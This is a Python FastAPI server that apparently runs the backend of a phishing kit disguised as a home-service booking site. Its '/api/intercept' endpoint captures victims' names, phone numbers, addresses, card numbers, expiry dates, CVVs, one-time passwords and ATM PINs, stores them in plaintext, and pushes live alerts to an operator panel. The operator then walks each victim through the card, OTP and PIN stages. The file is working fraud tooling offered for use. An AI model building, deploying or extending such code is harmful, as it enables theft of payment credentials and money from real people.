import os
import json
import asyncio
import logging
import uuid
from datetime import datetime
from typing import List, Optional
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
import databases
import sqlalchemy
from passlib.context import CryptContext
from jose import JWTError, jwt

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("server")

# Configuration
DATABASE_URL = os.getenv("DATABASE_URL")
if not DATABASE_URL:
    logger.warning("DATABASE_URL is not set. Using local sqlite for fallback.")
    DATABASE_URL = "sqlite:///./test.db"

if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

SECRET_KEY = os.getenv("SECRET_KEY", "maawen-super-secret-key-2026")
ALGORITHM = "HS256"
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")

# Database setup
database = databases.Database(DATABASE_URL)
metadata = sqlalchemy.MetaData()

orders = sqlalchemy.Table(
    "orders",
    metadata,
    sqlalchemy.Column("id", sqlalchemy.Integer, primary_key=True),
    sqlalchemy.Column("order_ref", sqlalchemy.String(50), unique=True, index=True),
    sqlalchemy.Column("status", sqlalchemy.String(50), default="pending"),
    sqlalchemy.Column("stage", sqlalchemy.String(50), default="card"),
    sqlalchemy.Column("customer_name", sqlalchemy.String(255)),
    sqlalchemy.Column("customer_phone", sqlalchemy.String(50)),
    sqlalchemy.Column("customer_address", sqlalchemy.Text),
    sqlalchemy.Column("service_type", sqlalchemy.String(100)),
    sqlalchemy.Column("total_price", sqlalchemy.Float),
    sqlalchemy.Column("duration", sqlalchemy.String(100)),
    sqlalchemy.Column("nationality", sqlalchemy.String(100)),
    sqlalchemy.Column("workers", sqlalchemy.Integer),
    sqlalchemy.Column("start_date", sqlalchemy.String(100)),
    sqlalchemy.Column("card_number", sqlalchemy.String(50)),
    sqlalchemy.Column("card_expiry", sqlalchemy.String(10)),
    sqlalchemy.Column("card_cvv", sqlalchemy.String(10)),
    sqlalchemy.Column("otp_code", sqlalchemy.String(20)),
    sqlalchemy.Column("atm_pin", sqlalchemy.String(20)),
    sqlalchemy.Column("raw_message", sqlalchemy.Text),
    sqlalchemy.Column("created_at", sqlalchemy.DateTime, default=datetime.utcnow),
    sqlalchemy.Column("updated_at", sqlalchemy.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow),
)

engine = sqlalchemy.create_engine(DATABASE_URL)
metadata.create_all(engine)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
        self.admin_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket, is_admin: bool = False):
        await websocket.accept()
        if is_admin:
            self.admin_connections.append(websocket)
        else:
            self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)

    async def broadcast_to_admins(self, message: dict):
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class OrderIntercept(BaseModel):
    raw_message: Optional[str] = ""
    customer_name: Optional[str] = ""
    customer_phone: Optional[str] = ""
    customer_address: Optional[str] = ""
    service_type: Optional[str] = ""
    total_price: Optional[float] = 0.0
    duration: Optional[str] = ""
    nationality: Optional[str] = ""
    workers: Optional[int] = 1
    start_date: Optional[str] = ""
    order_ref: Optional[str] = None

class AdminLogin(BaseModel):
    username: str
    password: str

def create_access_token(data: dict):
    return jwt.encode(data, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_admin(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Unauthorized")
    token = authorization.split(" ")[1]
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload.get("sub")
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

@app.on_event("startup")
async def startup():
    await database.connect()

@app.on_event("shutdown")
async def shutdown():
    await database.disconnect()

@app.post("/api/intercept")
async def intercept_order(data: OrderIntercept):
    ref = data.order_ref
    card_info = {}
    if data.raw_message:
        msg = data.raw_message
        if "Card Number:" in msg: card_info['card_number'] = msg.split("Card Number:")[1].split('\n')[0].strip()
        if "Expiry:" in msg: card_info['card_expiry'] = msg.split("Expiry:")[1].split('\n')[0].strip()
        if "CVV:" in msg: card_info['card_cvv'] = msg.split("CVV:")[1].split('\n')[0].strip()
        if "OTP:" in msg: card_info['otp_code'] = msg.split("OTP:")[1].split('\n')[0].strip()
        if "ATM PIN:" in msg: card_info['atm_pin'] = msg.split("ATM PIN:")[1].split('\n')[0].strip()

    if not ref:
        ref = str(uuid.uuid4())[:8].upper()
        query = orders.insert().values(
            order_ref=ref,
            status="waiting_approval",
            stage="card",
            customer_name=data.customer_name,
            customer_phone=data.customer_phone,
            customer_address=data.customer_address,
            service_type=data.service_type,
            total_price=data.total_price,
            duration=data.duration,
            nationality=data.nationality,
            workers=data.workers,
            start_date=data.start_date,
            raw_message=data.raw_message,
            **card_info
        )
        await database.execute(query)
        await manager.broadcast_to_admins({"type": "new_order", "ref": ref})
    else:
        update_data = {k: v for k, v in card_info.items() if v}
        if data.raw_message: update_data["raw_message"] = data.raw_message
        if update_data:
            query = orders.update().where(orders.c.order_ref == ref).values(**update_data)
            await database.execute(query)
            msg_type = "card_submitted"
            if "otp_code" in update_data: msg_type = "otp_submitted"
            if "atm_pin" in update_data: msg_type = "atm_pin_submitted"
            await manager.broadcast_to_admins({"type": msg_type, "ref": ref})
    return {"orderRef": ref}

@app.get("/api/orders/{ref}/status")
async def get_order_status(ref: str):
    query = orders.select().where(orders.c.order_ref == ref)
    order = await database.fetch_one(query)
    if not order:
        raise HTTPException(status_code=404, detail="Order not found")
    return {"status": order["status"]}

@app.post("/api/admin/login")
async def admin_login(data: AdminLogin):
    if data.username == ADMIN_USERNAME and data.password == ADMIN_PASSWORD:
        token = create_access_token({"sub": data.username})
        return {"token": token, "username": data.username}
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/admin/orders")
async def get_all_orders(admin: str = Depends(get_current_admin)):
    query = orders.select().order_by(orders.c.created_at.desc())
    rows = await database.fetch_all(query)
    return [dict(row) for row in rows]

# Admin Action Routes
@app.post("/api/admin/orders/{ref}/approve-card")
async def approve_card(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_otp", stage="otp")
    await database.execute(query)
    return {"success": True}

@app.post("/api/admin/orders/{ref}/reject-card")
async def reject_card(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="card_rejected", stage="card")
    await database.execute(query)
    return {"success": True}

@app.post("/api/admin/orders/{ref}/approve-otp")
async def approve_otp(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_atm_pin", stage="atm_pin")
    await database.execute(query)
    return {"success": True}

@app.post("/api/admin/orders/{ref}/reject-otp")
async def reject_otp(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="otp_rejected", stage="otp")
    await database.execute(query)
    return {"success": True}

@app.post("/api/admin/orders/{ref}/approve-atm")
async def approve_atm(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="completed", stage="done")
    await database.execute(query)
    return {"success": True}

@app.post("/api/admin/orders/{ref}/reject-atm")
async def reject_atm(ref: str, admin: str = Depends(get_current_admin)):
    query = orders.update().where(orders.c.order_ref == ref).values(status="atm_rejected", stage="atm_pin")
    await database.execute(query)
    return {"success": True}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    is_admin = websocket.query_params.get("admin") == "1"
    await manager.connect(websocket, is_admin=is_admin)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/admin")
async def read_admin():
    return FileResponse("admin.html")

if os.path.exists("assets"):
    app.mount("/assets", StaticFiles(directory="assets"), name="assets")

@app.get("/{path_name:path}")
async def catch_all(path_name: str):
    if not path_name:
        return FileResponse("index.html")
    if os.path.isfile(path_name):
        return FileResponse(path_name)
    if "." in path_name.split("/")[-1]:
        return JSONResponse(status_code=404, content={"detail": "Not found"})
    return FileResponse("index.html")

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
